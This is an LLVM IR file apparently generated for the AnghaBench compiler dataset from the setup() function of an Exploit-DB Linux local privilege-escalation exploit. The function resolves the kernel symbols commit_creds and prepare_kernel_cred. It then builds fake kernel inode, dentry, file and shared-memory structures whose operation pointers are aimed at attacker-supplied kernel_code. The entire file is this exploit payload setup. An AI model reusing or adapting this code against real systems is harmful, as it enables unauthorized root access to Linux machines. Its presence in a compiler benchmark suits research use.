; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_14814.c_setup.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_14814.c_setup.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_19__ = type { i64 }
%struct.TYPE_22__ = type { i32, %struct.TYPE_15__, %struct.TYPE_14__, %struct.TYPE_19__* }
%struct.TYPE_15__ = type { i32 }
%struct.TYPE_14__ = type { %struct.TYPE_14__*, %struct.TYPE_14__* }
%struct.TYPE_13__ = type { i32, i32, %struct.TYPE_22__*, i32* }
%struct.TYPE_21__ = type { i32*, i32* }
%struct.TYPE_18__ = type { i32, i64 }
%struct.TYPE_12__ = type { %struct.TYPE_21__*, %struct.TYPE_18__*, %struct.TYPE_13__*, %struct.TYPE_16__ }
%struct.TYPE_16__ = type { %struct.TYPE_16__*, %struct.TYPE_16__* }
%struct.TYPE_20__ = type { %struct.TYPE_12__*, %struct.TYPE_17__ }
%struct.TYPE_17__ = type { i32, i8*, i8*, i8*, i8*, i32 }

@.str = private unnamed_addr constant [28 x i8] c"[+] looking for symbols...\0A\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [42 x i8] c"[-] symbol table not availabe, aborting!\0A\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [35 x i8] c"[+] setting up exploit payload...\0A\00", align 1
@super_block = common dso_local global %struct.TYPE_19__ zeroinitializer, align 8
@inode = common dso_local global %struct.TYPE_22__ zeroinitializer, align 8
@dentry = common dso_local global %struct.TYPE_13__ zeroinitializer, align 8
@kernel_code = common dso_local global i32 0, align 4
@op = common dso_local global %struct.TYPE_21__ zeroinitializer, align 8
@vfsmount = common dso_local global %struct.TYPE_18__ zeroinitializer, align 8
@file = common dso_local global %struct.TYPE_12__ zeroinitializer, align 8
@IPC_PRIVATE = common dso_local global i32 0, align 4
@shmid_kernel = common dso_local global %struct.TYPE_20__ zeroinitializer, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @setup() #0 {
  %1 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0))
  %2 = call i64 @get_symbol(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0))
  store i64 %2, i64* @commit_creds, align 8
  %3 = load i64, i64* @commit_creds, align 8
  %4 = icmp ne i64 %3, 0
  br i1 %4, label %7, label %5

5:                                                ; preds = %0
  %6 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0))
  br label %7

7:                                                ; preds = %5, %0
  %8 = call i64 @get_symbol(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  store i64 %8, i64* @prepare_kernel_cred, align 8
  %9 = load i64, i64* @prepare_kernel_cred, align 8
  %10 = icmp ne i64 %9, 0
  br i1 %10, label %13, label %11

11:                                               ; preds = %7
  %12 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0))
  br label %13

13:                                               ; preds = %11, %7
  %14 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_19__, %struct.TYPE_19__* @super_block, i32 0, i32 0), align 8
  store i32 4096, i32* getelementptr inbounds (%struct.TYPE_22__, %struct.TYPE_22__* @inode, i32 0, i32 0), align 8
  store %struct.TYPE_19__* @super_block, %struct.TYPE_19__** getelementptr inbounds (%struct.TYPE_22__, %struct.TYPE_22__* @inode, i32 0, i32 3), align 8
  store %struct.TYPE_14__* getelementptr inbounds (%struct.TYPE_22__, %struct.TYPE_22__* @inode, i32 0, i32 2), %struct.TYPE_14__** getelementptr inbounds (%struct.TYPE_22__, %struct.TYPE_22__* @inode, i32 0, i32 2, i32 1), align 8
  store %struct.TYPE_14__* getelementptr inbounds (%struct.TYPE_22__, %struct.TYPE_22__* @inode, i32 0, i32 2), %struct.TYPE_14__** getelementptr inbounds (%struct.TYPE_22__, %struct.TYPE_22__* @inode, i32 0, i32 2, i32 0), align 8
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_22__, %struct.TYPE_22__* @inode, i32 0, i32 1, i32 0), align 4
  store i32 4096, i32* getelementptr inbounds (%struct.TYPE_13__, %struct.TYPE_13__* @dentry, i32 0, i32 0), align 8
  store i32 4096, i32* getelementptr inbounds (%struct.TYPE_13__, %struct.TYPE_13__* @dentry, i32 0, i32 1), align 4
  store i32* null, i32** getelementptr inbounds (%struct.TYPE_13__, %struct.TYPE_13__* @dentry, i32 0, i32 3), align 8
  store %struct.TYPE_22__* @inode, %struct.TYPE_22__** getelementptr inbounds (%struct.TYPE_13__, %struct.TYPE_13__* @dentry, i32 0, i32 2), align 8
  store i32* @kernel_code, i32** getelementptr inbounds (%struct.TYPE_21__, %struct.TYPE_21__* @op, i32 0, i32 1), align 8
  store i32* @kernel_code, i32** getelementptr inbounds (%struct.TYPE_21__, %struct.TYPE_21__* @op, i32 0, i32 0), align 8
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_18__, %struct.TYPE_18__* @vfsmount, i32 0, i32 1), align 8
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_18__, %struct.TYPE_18__* @vfsmount, i32 0, i32 0), align 8
  store %struct.TYPE_16__* getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @file, i32 0, i32 3), %struct.TYPE_16__** getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @file, i32 0, i32 3, i32 1), align 8
  store %struct.TYPE_16__* getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @file, i32 0, i32 3), %struct.TYPE_16__** getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @file, i32 0, i32 3, i32 0), align 8
  store %struct.TYPE_13__* @dentry, %struct.TYPE_13__** getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @file, i32 0, i32 2), align 8
  store %struct.TYPE_18__* @vfsmount, %struct.TYPE_18__** getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @file, i32 0, i32 1), align 8
  store %struct.TYPE_21__* @op, %struct.TYPE_21__** getelementptr inbounds (%struct.TYPE_12__, %struct.TYPE_12__* @file, i32 0, i32 0), align 8
  %15 = load i32, i32* @IPC_PRIVATE, align 4
  store i32 %15, i32* getelementptr inbounds (%struct.TYPE_20__, %struct.TYPE_20__* @shmid_kernel, i32 0, i32 1, i32 5), align 8
  %16 = call i8* (...) @getuid()
  store i8* %16, i8** getelementptr inbounds (%struct.TYPE_20__, %struct.TYPE_20__* @shmid_kernel, i32 0, i32 1, i32 4), align 8
  %17 = call i8* (...) @getgid()
  store i8* %17, i8** getelementptr inbounds (%struct.TYPE_20__, %struct.TYPE_20__* @shmid_kernel, i32 0, i32 1, i32 3), align 8
  %18 = call i8* (...) @getuid()
  store i8* %18, i8** getelementptr inbounds (%struct.TYPE_20__, %struct.TYPE_20__* @shmid_kernel, i32 0, i32 1, i32 2), align 8
  %19 = call i8* (...) @getgid()
  store i8* %19, i8** getelementptr inbounds (%struct.TYPE_20__, %struct.TYPE_20__* @shmid_kernel, i32 0, i32 1, i32 1), align 8
  store i32 -1, i32* getelementptr inbounds (%struct.TYPE_20__, %struct.TYPE_20__* @shmid_kernel, i32 0, i32 1, i32 0), align 8
  store %struct.TYPE_12__* @file, %struct.TYPE_12__** getelementptr inbounds (%struct.TYPE_20__, %struct.TYPE_20__* @shmid_kernel, i32 0, i32 0), align 8
  ret void
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @get_symbol(i8*) #1

declare dso_local i8* @getuid(...) #1

declare dso_local i8* @getgid(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
